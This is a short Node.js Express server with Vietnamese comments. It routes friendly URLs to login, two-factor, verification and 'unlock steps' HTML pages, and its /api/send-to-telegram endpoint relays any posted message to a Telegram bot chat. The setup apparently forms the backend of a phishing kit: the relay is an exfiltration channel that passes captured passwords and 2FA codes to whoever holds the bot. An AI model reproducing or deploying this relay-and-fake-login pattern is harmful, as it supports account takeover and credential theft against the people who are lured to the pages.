require('dotenv').config();
const express = require('express');
const axios = require('axios');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware để xử lý JSON body
app.use(express.json());

// Phục vụ các file tĩnh từ thư mục 'public'
// Điều này quan trọng để các file CSS, JS, hình ảnh của bạn được tải đúng cách
app.use(express.static(path.join(__dirname, 'public')));


// --- Định tuyến các URL thân thiện ---
// Trang chủ (index.html) -> /
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Trang đăng nhập (login_page.html) -> /login
app.get('/login', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'login_page.html'));
});

// Trang xác thực 2 yếu tố (2fa_page.html) -> /complete
app.get('/complete', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', '2fa_page.html'));
});

// Nếu bạn có các file HTML khác và muốn chúng có URL thân thiện:
// Ví dụ: verification.html -> /verification
app.get('/verification', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'verification.html'));
});
// Ví dụ: unlock_steps.html -> /unlock_step
app.get('/unlock_step', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'unlock_steps.html'));
});


// --- Telegram Proxy Endpoint ---
app.post('/api/send-to-telegram', async (req, res) => {
    try {
        const { message } = req.body;
        
        // Kiểm tra xem token và chat ID đã được cấu hình trong .env chưa
        if (!process.env.TELEGRAM_BOT_TOKEN || !process.env.TELEGRAM_CHAT_ID) {
            console.error('Telegram bot token or chat ID is not configured in .env');
            return res.status(500).json({ success: false, error: 'Telegram API credentials missing.' });
        }

        const response = await axios.post(
            `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`,
            {
                chat_id: process.env.TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: 'HTML' // Đảm bảo tin nhắn được định dạng HTML
            }
        );
        
        res.json({ success: true, telegramResponse: response.data });
    } catch (error) {
        console.error('Telegram API Error:', error.response?.data?.description || error.message);
        res.status(500).json({ 
            success: false,
            error: 'Failed to send message to Telegram',
            details: error.response?.data || error.message
        });
    }
});

// --- Xử lý 404 Not Found ---
// Đặt route này cuối cùng để bắt tất cả các yêu cầu không khớp với bất kỳ route nào khác.
app.use((req, res) => {
    console.log(`404 Not Found for URL: ${req.originalUrl}`);
    res.status(404).send('Page Not Found');
});

// --- Khởi động server ---
app.listen(PORT, () => {
    console.log(`Server running on port ${PORT}`);
    console.log(`Access points:`);
    console.log(` - http://localhost:${PORT}/`);
    console.log(` - http://localhost:${PORT}/login`);
    console.log(` - http://localhost:${PORT}/complete`);
    console.log(` - (Nếu có) http://localhost:${PORT}/verification`);
    console.log(` - (Nếu có) http://localhost:${PORT}/unlock_step`);
});
